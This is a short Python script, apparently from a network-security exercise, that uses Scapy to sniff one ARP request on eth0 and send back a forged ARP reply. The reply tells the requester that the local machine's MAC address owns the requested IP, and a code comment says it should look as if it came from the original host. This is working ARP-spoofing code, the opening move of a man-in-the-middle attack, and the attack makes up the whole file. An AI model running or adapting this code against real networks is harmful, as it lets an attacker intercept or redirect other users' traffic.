#!/usr/bin/python3
from scapy.all import *
import netifaces as ni
import uuid

# Our eth0 ip
ipaddr = ni.ifaddresses('eth0')[ni.AF_INET][0]['addr']
# Our eth0 mac address
macaddr = ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0,8*6,8)][::-1])

def handle_arp_packets(packet):
    # if arp request, then we need to fill this out to send back our mac as the response
    print(f"My IP: {ipaddr}")
    print(f"My MAC: {macaddr}")
    print(f"Their IP: {packet[ARP].psrc}")
    print(f"Their MAC: {packet[ARP].hwsrc}")

    if ARP in packet and packet[ARP].op == 1:
        ether_resp = Ether(dst=packet[ARP].hwsrc, type=0x0806, src=macaddr)

        arp_response = ARP(pdst=packet[ARP].psrc)
        arp_response.op = 2
        arp_response.plen = 4
        arp_response.hwlen = 6
        arp_response.ptype = 0x0800
        arp_response.hwtype = 0x01

        arp_response.hwsrc = macaddr
        # we need to make it look as if this came from the original host, not us!
        arp_response.psrc = packet[ARP].pdst
        arp_response.hwdst = packet[ARP].hwsrc
        arp_response.pdst = packet[ARP].psrc

        response = ether_resp/arp_response

        # Some debugging
        response.show()

        sendp(response, iface="eth0")

def main():
    # We only want arp requests
    berkeley_packet_filter = "(arp[6:2] = 1)"
    # sniffing for one packet that will be sent to a function, while storing none
    sniff(filter=berkeley_packet_filter, prn=handle_arp_packets, store=0, count=1)

if __name__ == "__main__":
    main()
